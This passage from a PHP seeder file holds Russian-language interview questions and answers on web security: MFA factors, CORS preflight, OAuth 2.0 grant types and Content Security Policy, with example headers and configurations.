- Не работает для динамических скриптов через `document.createElement("script")` без явного `integrity`',
                'difficulty' => 4,
                'topic' => 'system_design.security',
            ],
            [
                'category' => 'Архитектура систем',
                'question' => 'Зачем нужна многофакторная аутентификация, если пароль уже надёжный?',
                'answer' => 'Любой пароль **может утечь**, и пользователь не узнает об этом:

- **фишинг** — ввёл на поддельной странице
- **password reuse** — слили базу соседнего сайта, тот же пароль работает у тебя
- **кейлоггер** на скомпрометированном устройстве
- **brute force / credential stuffing** — атакующий пробует пары `email/password` из утечек
- **внутренние** утечки (insider threat, упавший backup)

**MFA добавляет второй фактор из другой категории** — украсть оба одновременно гораздо сложнее.

**Три категории факторов:**

1. **Знание** (something you know) — пароль, PIN, ответ на секретный вопрос
2. **Владение** (something you have) — TOTP-приложение, аппаратный ключ, SMS на телефон, push в banking app
3. **Биометрия** (something you are) — отпечаток, Face ID, голос

Настоящий **MFA** — это **два фактора из разных категорий**. Два пароля — это не MFA.

**Сравнение реализаций:**

| Метод | RFC/стандарт | Защита от фишинга | Минусы |
|---|---|---|---|
| **`TOTP`** (Google Authenticator) | RFC 6238 | средняя — код можно ввести на поддельной странице | seed надо беречь |
| **SMS** | — | низкая — **SIM-swap**, перехват SS7 | NIST не рекомендует, но лучше чем ничего |
| **Push** (banking app) | — | средняя — пользователь может одобрить случайно | требует доверенного устройства |
| **`WebAuthn`/FIDO2** (YubiKey, Passkeys) | W3C/CTAP2 | **высокая — привязка к домену** | железо или поддержка ОС |

**Главное преимущество `WebAuthn`:** ключ подписывает запрос **с указанием домена**. Фишинговая страница `bank-evil.com` не получит валидную подпись для `bank.com`. **Невозможно зафишить**.

**Где обязателен MFA:** админ-панели, доступ к продакшену, банки, корп-аккаунты. Для обычного юзера — `TOTP`/passkey по умолчанию + recovery codes.',
                'difficulty' => 3,
                'topic' => 'system_design.security',
            ],
            [
                'category' => 'Архитектура систем',
                'question' => 'Как работает CORS preflight и когда он отправляется?',
                'answer' => '**Preflight** — браузер шлёт **`OPTIONS`-запрос перед** «непростым» (non-simple) cross-origin запросом, чтобы убедиться, что сервер его разрешает. Это **спецификация Fetch**, выполняется браузером автоматически.

**Когда preflight ОТПРАВЛЯЕТСЯ (non-simple):**

- Методы: **`PUT`**, **`DELETE`**, **`PATCH`**, `CONNECT`, `TRACE`
- Кастомные заголовки: **`Authorization`**, `X-CSRF-TOKEN`, `X-Custom-*`
- `Content-Type` **вне** простого списка: `application/x-www-form-urlencoded`, `multipart/form-data`, `text/plain`
- Использование `ReadableStream`/`fetch` с upload progress

**Когда preflight НЕ нужен (simple request):**

- `GET`, `HEAD`, `POST`
- Заголовки только из CORS-safelist: `Accept`, `Accept-Language`, `Content-Language`, `Content-Type` из списка выше
- Без `ReadableStream` в теле

**Preflight-запрос:**

```
OPTIONS /api/users HTTP/1.1
Origin: https://app.example.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: Authorization, Content-Type
```

**Ответ сервера:**

```
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Authorization, Content-Type
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 86400
```

**`Access-Control-Max-Age`** — кэш preflight-ответа в браузере (в секундах). `86400` = сутки. Без него браузер шлёт `OPTIONS` **перед каждым** запросом — заметная задержка.

**Типовые ошибки:**

- **`Allow-Origin: *` + `Allow-Credentials: true`** — браузер **откатит** ответ. С credentials нужен **конкретный origin**
- **Забыть `OPTIONS` в роутах фреймворка** → **`405 Method Not Allowed`** на preflight, основной запрос не уйдёт
- **Echo `Origin` без whitelist** — `Allow-Origin: <любой origin>` = `*` с credentials, дыра
- **Заголовок не указан в `Allow-Headers`** — браузер режет, ошибка в DevTools

**В Laravel:** `config/cors.php` (пакет `fruitcake/laravel-cors` встроен) — `paths`, `allowed_origins`, `allowed_methods`, `supports_credentials`, `max_age`.',
                'difficulty' => 4,
                'topic' => 'system_design.security',
            ],
            [
                'category' => 'Архитектура систем',
                'question' => 'Какие grant types в OAuth 2.0 актуальны и как выбрать нужный?',
                'answer' => 'OAuth 2.1 (draft, фактический стандарт сегодня) **сократил** набор: убрал `Implicit` и `ROPC`, **сделал `PKCE` обязательным** для всех клиентов.

**Актуальные grant types:**

| Grant | Когда брать | Пример |
|---|---|---|
| **Authorization Code + `PKCE`** | веб-приложение, SPA, mobile с юзером | «Login with Google» |
| **Client Credentials** | server-to-server, без юзера | cron вызывает чужой API |
| **Refresh Token** | продление сессии без перелогина | мобильное приложение через неделю |
| **Device Authorization Grant** | устройства без удобного ввода | Smart TV, CLI, IoT |

**Устаревшие (НЕ использовать):**

| Grant | Почему устарел |
|---|---|
| **Implicit** | токен в `URL fragment` → утечка в `Referer`, history, server logs. Заменён **Code + PKCE** для SPA |
| **Resource Owner Password Credentials (`ROPC`)** | юзер отдаёт пароль **самому приложению** — нарушает идею делегирования |

**Authorization Code + PKCE — выбор по умолчанию:**

1. Client генерирует `code_verifier` (random `43–128` chars) и `code_challenge = SHA256(verifier)`
2. Redirect на `/authorize?response_type=code&code_challenge=...&code_challenge_method=S256`
3. Юзер логинится → редирект с `?code=abc`
4. Client шлёт `POST /token` с `code` + **`code_verifier`** (не challenge)
5. Server проверяет `SHA256(verifier) == challenge` → выдаёт токены

**PKCE защищает от** перехвата `code` (mobile redirect intent hijacking, malicious browser extension).

**Client Credentials:**

```bash
curl -X POST https://auth.example.com/oauth/token \
  -d "grant_type=client_credentials" \
  -d "client_id=$ID" \
  -d "client_secret=$SECRET" \
  -d "scope=orders.read"
```

**Device Code flow:** устройство показывает короткий код (`ABCD-1234`) и URL, юзер открывает его на телефоне, авторизует — устройство периодически опрашивает `/token`.

**Правило выбора:** есть юзер + браузер? → **Code + PKCE**. Нет юзера? → **Client Credentials**. Нет браузера, но есть юзер? → **Device Code**.',
                'difficulty' => 4,
                'topic' => 'system_design.security',
            ],
            [
                'category' => 'Архитектура систем',
                'question' => 'Что такое Content Security Policy (CSP)?',
                'answer' => '**CSP** (Content Security Policy, W3C) — HTTP-заголовок, говорящий браузеру **откуда можно загружать ресурсы** (JS, CSS, картинки, `fetch`, iframe). Главная защита **глубокой обороны от XSS**: даже если атакующий внедрил `<script>`, браузер **откажется его выполнять**, если источник не в whitelist.

**Ключевые директивы:**

- **`default-src`** — fallback для всего, обычно `\'self\'`
- **`script-src`** — JS-источники, **главная защита от XSS**
- **`style-src`** — CSS
- **`img-src`** — картинки
- **`connect-src`** — `fetch`/`XHR`/`WebSocket` цели
- **`frame-src`** / **`frame-ancestors`** — кто может встраиваться/быть встроенным (защита от clickjacking)
- **`object-src \'none\'`** — запрет Flash/`<object>`
- **`base-uri \'self\'`** — защита от `<base>` injection
- **`form-action`** — куда могут уходить формы
- **`upgrade-insecure-requests`** — авто-апгрейд `http://` в `https://`
- **`report-uri`** / **`report-to`** — куда слать отчёты о нарушениях

**Источники в значениях:**

- **`\'self\'`** — тот же origin
- **`\'none\'`** — никто
- **`\'unsafe-inline\'`** — разрешить inline-скрипты (**убивает защиту от XSS**, избегать)
- **`\'unsafe-eval\'`** — разрешить `eval` (тоже плохо)
- **`\'nonce-RANDOM\'`** — inline-скрипты с конкретным `nonce`
- **`\'strict-dynamic\'`** — доверять скриптам, загруженным разрешёнными скриптами

**Современный безопасный CSP — `nonce + strict-dynamic`:**

```
script-src \'nonce-aBcD1234\' \'strict-dynamic\';
```

Сервер генерирует **уникальный `nonce` на каждый запрос**, кладёт в заголовок и в каждый свой `<script nonce="aBcD1234">`. Атакующий через XSS не знает `nonce`, его скрипт не запустится.

**Report-Only режим — тестирование без блокировок:**

```
Content-Security-Policy-Report-Only: ...; report-uri /csp-report
```

Браузер шлёт `POST` с описанием нарушения, но **не блокирует**. Удобно для постепенного внедрения.

**Грабли:**

- `\'unsafe-inline\'` в `script-src` = **CSP не защищает от XSS**
- забыл `connect-src` — `fetch` к API не работает
- inline `<style>` атрибуты требуют `\'unsafe-inline\'` в `style-src`
- Google Analytics, GTM требуют отдельных доменов в `script-src`',
                'code_example' => '# Production CSP с nonce
Content-Security-Policy:
  default-src \'self\';
  script-src \'self\' \'nonce-aBcD1234\' \'strict-dynamic\';
  style-src \'self\' \'unsafe-inline\';
  img-src \'self\' data: https:;
  connect-src \'self\' https://api.example.com;
  frame-ancestors \'none\';
  base-uri \'self\';
  form-action \'self\';
  object-src \'none\';
  upgrade-insecure-requests;
  report-uri /csp-report

# Тестовый режим (не блокирует, только репорты)
Content-Security-Policy-Report-Only:
  default-src \'self\';
  report-uri /csp-report

# Сгенерировать nonce на запрос (Laravel middleware)
# $nonce = base64_encode(random_bytes(16));
# <script nonce="<?= $nonce ?>">...</script>',
                'code_language' => 'bash',
                'difficulty' => 4,
                'topic' => 'system_design.security',
            ],
        ];
    }
}
